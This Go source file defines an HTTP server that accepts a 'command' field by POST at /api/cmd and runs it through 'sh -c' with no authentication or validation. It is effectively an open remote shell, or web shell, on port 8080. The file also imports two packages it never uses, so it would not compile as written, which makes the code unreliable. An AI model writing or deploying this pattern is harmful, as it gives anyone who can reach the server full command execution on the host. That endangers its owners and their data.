package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func executeShellCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func handleCommandRequest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	command := r.FormValue("command")
	if command == "" {
		http.Error(w, "Command not provided", http.StatusBadRequest)
		return
	}

	output, err := executeShellCommand(command)
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			w.WriteHeader(http.StatusNotFound)
			w.Write([]byte(exitErr.Error()))
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(output))
}

func main() {
	http.HandleFunc("/api/cmd", handleCommandRequest)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
